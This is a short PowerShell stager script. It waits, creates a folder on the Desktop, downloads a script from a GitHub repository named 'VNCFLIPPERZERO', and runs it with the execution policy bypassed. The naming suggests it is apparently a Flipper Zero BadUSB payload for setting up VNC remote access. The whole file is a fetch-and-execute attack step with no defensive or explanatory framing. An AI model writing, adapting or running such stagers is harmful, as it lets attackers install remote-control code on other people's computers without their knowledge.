# Wait for 2 seconds
Start-Sleep -Seconds 2

# Define the URL for the first script to download
$url = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/your-script.ps1"

# Define the local file path for the first script
$filePath = "$env:USERPROFILE\Desktop\inentor\your-script.ps1"

# Create the folder if it doesn't exist
if (!(Test-Path -Path "$env:USERPROFILE\Desktop\inentor")) {
    New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\inentor" -Force
}

# Download the first script
Invoke-WebRequest -Uri $url -OutFile $filePath
# Wait for 2 seconds
Start-Sleep -Seconds 2

# Use PowerShell to run the downloaded script
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$filePath`""
